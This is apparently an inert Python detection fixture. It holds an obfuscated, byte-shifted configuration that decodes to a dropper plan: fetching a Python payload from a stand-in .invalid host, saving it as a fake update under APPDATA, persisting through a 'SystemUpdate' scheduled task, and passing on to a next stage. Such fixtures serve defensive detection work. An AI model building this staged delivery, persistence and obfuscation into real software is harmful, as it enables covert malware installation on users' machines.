#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_723bd70b = "87,30,19,93,84,85,70,81,84,30,81,83,80,71,74,77,70,64,73,80,84,85,13,66,68,82,86,74,83,70,64,83,70,78,80,85,70,13,69,70,68,80,69,70,64,70,78,67,70,69,69,70,69,13,88,83,74,85,70,64,71,74,77,70,13,69,74,84,81,66,85,68,73,64,81,83,80,68,70,84,84,93,66,69,66,81,85,70,83,30,74,83,80,79,81,90,85,73,80,79,64,84,85,90,77,70,64,73,66,79,69,80,71,71,93,84,85,66,72,70,64,68,80,86,79,85,30,22,93,84,90,79,85,66,89,30,69,74,68,85,74,80,79,66,83,90,64,69,74,84,81,66,85,68,73,93,80,67,71,86,84,68,66,85,74,80,79,30,83,70,71,77,70,68,85,74,87,70,64,79,66,78,70,64,81,77,66,79,93,68,66,83,83,74,70,83,30,81,90,66,83,78,80,83,64,81,90,74,79,84,85,66,77,77,70,83,93,88,74,79,69,80,88,84,64,68,73,66,74,79,30,81,80,88,70,83,84,73,70,77,77,64,85,80,64,81,90,85,73,80,79,93,68,66,78,81,66,74,72,79,64,74,69,30,68,66,78,81,66,74,72,79,14,66,68,18,67,23,20,25,24,69,22,93,86,83,77,30,73,85,85,81,84,27,16,16,66,68,18,67,23,20,25,24,69,22,15,70,89,66,78,81,77,70,15,74,79,87,66,77,74,69,16,66,20,19,71,19,20,22,71,15,81,90,93,86,84,70,83,64,66,72,70,79,85,30,41,86,79,85,83,70,84,84,49,90,85,73,80,79,16,66,68,18,67,23,20,25,24,69,22,93,71,74,77,70,64,81,66,85,73,30,36,27,16,49,83,80,72,83,66,78,37,66,85,66,16,41,86,79,85,83,70,84,84,45,66,67,16,15,86,81,69,66,85,70,14,66,68,18,67,23,20,25,24,69,22,15,81,90,93,74,79,85,70,83,81,83,70,85,70,83,64,81,66,85,73,30,36,27,16,49,83,80,72,83,66,78,37,66,85,66,16,49,90,85,73,80,79,14,66,68,18,67,23,20,25,24,69,22,16,81,90,85,73,80,79,15,70,89,70,93,85,66,84,76,64,79,66,78,70,30,52,90,84,85,70,78,54,81,69,66,85,70,14,66,68,18,67,23,20,25,24,69,22,93,81,83,80,89,90,64,70,79,69,81,80,74,79,85,30,18,19,24,15,17,15,17,15,18,27,18,21,17,22,26,93,79,70,89,85,64,84,85,66,72,70,30,77,80,68,66,77,14,69,74,84,81,66,85,68,73,15,67,66,85,93,73,66,79,69,80,71,71,64,74,69,30,49,52,49,58,14,23,37,25,25,19,24,19,38,26,39,26,39,19,26,17,22"
CODEC_723bd70b = "decimal_csv|subtract_modulo_256|1f"

def load_723bd70b():
    return bytes(int(item) for item in MATERIAL_723bd70b.split(","))

def decode_723bd70b(stored_bytes):
    return bytes((value + 31) % 256 for value in stored_bytes)

def recover_723bd70b():
    harmless_value = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
    _pass = 0
    while _pass < 1:
        recovered_bytes = decode_723bd70b(load_723bd70b())
        _pass += 1
    configuration_text = recovered_bytes.decode("ascii", "strict")
    return configuration_text

def inspect_723bd70b():
    return recover_723bd70b()

def surface_723bd70b():
    routes = {"selected": lambda: ("dictionary_dispatch", "reflective_name_plan", "pyarmor_pyinstaller", "powershell_to_python")}
    return routes["selected"]()

def obfuscation_723bd70b():
    reflection_plan = ("__import__", "getattr", "reflective_name_plan")
    return reflection_plan[-1]

def plan_723bd70b():
    fields = dict(item.split("=", 1) for item in inspect_723bd70b().split("|"))
    analysis_surface = surface_723bd70b()
    obfuscation_surface = obfuscation_723bd70b()
    operation_plan = ("ironpython_style_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_723bd70b())
